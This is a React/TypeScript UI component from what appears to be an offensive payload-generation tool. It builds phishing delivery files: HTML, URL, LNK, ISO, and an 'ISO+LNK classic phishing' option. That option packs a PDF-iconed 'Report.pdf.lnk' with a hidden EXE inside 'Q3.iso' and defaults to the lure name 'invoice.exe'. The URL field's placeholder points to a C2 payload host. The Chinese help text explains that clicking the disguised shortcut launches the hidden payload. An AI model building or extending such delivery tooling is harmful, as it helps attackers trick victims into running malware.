"use client";

import { useState } from "react";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { useI18n } from "@/lib/i18n";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { PayloadCard } from "./PayloadCard";
import { PackageOpen } from "lucide-react";

export default function DeliveryPanel() {
  const { t } = useI18n();
  const [format, setFormat] = useState("html");
  const [filename, setFilename] = useState("invoice.exe");
  const [url, setUrl] = useState("");
  const [command, setCommand] = useState("start notepad.exe");
  const [busy, setBusy] = useState(false);

  async function onGenerate() {
    setBusy(true);
    try {
      const res = await api.postJson<{ filename: string; data: string }>(paths.generate.delivery, {
        format,
        filename,
        url,
        command,
      });
      const bin = Uint8Array.from(atob(res.data), (c) => c.charCodeAt(0));
      const blob = new Blob([bin]);
      // Revoke after the download kicks off, otherwise every click leaks a
      // blob URL (and its backing bytes) for the lifetime of the document.
      const objectUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = objectUrl;
      a.download = res.filename || "delivery.bin";
      a.click();
      setTimeout(() => URL.revokeObjectURL(objectUrl), 10_000);
      toast.success(t("generate.delivery_done"));
    } catch (e) {
      toast.error(e instanceof Error ? e.message : t("generate.delivery_failed"));
    } finally {
      setBusy(false);
    }
  }

  return (
    <PayloadCard
      icon={<PackageOpen className="size-5" />}
      tint="bg-chart-4/10 text-chart-4"
      title={t("generate.delivery_title")}
      subtitle={t("generate.delivery_subtitle")}
      footer={
        <Button type="button" onClick={onGenerate} disabled={busy} className="h-11 w-full rounded-xl text-sm font-semibold tracking-tight shadow-md shadow-primary/20 transition-all duration-200 hover:shadow-lg hover:brightness-110 active:scale-[0.98]">
          {busy ? t("generate.panel.generating") : t("generate.delivery_build")}
        </Button>
      }
    >
      <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
        <div className="sm:col-span-2 rounded-xl border border-info/20 bg-info/5 px-3 py-2 text-xs leading-5 text-muted-foreground">
          ISO+LNK 为经典钓鱼投递：挂载后可见文档图标 LNK，点击即启动隐藏载荷。
        </div>
        <div>
          <Label>{t("generate.delivery_format")}</Label>
          <Select value={format} onValueChange={(v) => v && setFormat(v)}>
            <SelectTrigger className="w-full"><SelectValue /></SelectTrigger>
            <SelectContent>
              <SelectItem value="html">{t("generate.delivery_html")}</SelectItem>
              <SelectItem value="url">{t("generate.delivery_url")}</SelectItem>
              <SelectItem value="lnk">{t("generate.delivery_lnk")}</SelectItem>
              <SelectItem value="iso">{t("generate.delivery_iso")}</SelectItem>
              <SelectItem value="iso_lnk">ISO+LNK 经典钓鱼</SelectItem>
            </SelectContent>
          </Select>
        </div>
        <div>
          <Label>{t("generate.delivery_filename")}</Label>
          <Input value={filename} onChange={(e) => setFilename(e.target.value)} />
        </div>
        {format === "url" && (
          <div className="sm:col-span-2">
            <Label>{t("generate.delivery_url_target")}</Label>
            <Input value={url} onChange={(e) => setUrl(e.target.value)} placeholder="https://c2.example/payload" />
          </div>
        )}
        {format === "lnk" && (
          <div className="sm:col-span-2">
            <Label>{t("generate.delivery_cmd")}</Label>
            <Input value={command} onChange={(e) => setCommand(e.target.value)} />
          </div>
        )}
        {format === "iso_lnk" && (
          <div className="rounded-lg border border-warning/25 bg-warning/10 px-2.5 py-2 text-xs leading-5 text-warning-foreground sm:col-span-2">
            生成 <code className="rounded bg-background/60 px-1 font-mono">Q3.iso</code> 内含 <code className="rounded bg-background/60 px-1 font-mono">Report.pdf.lnk</code>（PDF 图标） + 隐藏的 <code className="rounded bg-background/60 px-1 font-mono">{filename || "Report.pdf.exe"}</code>，挂载后点击 LNK 即启动。filename 为隐藏 EXE 名。
          </div>
        )}
      </div>
    </PayloadCard>
  );
}
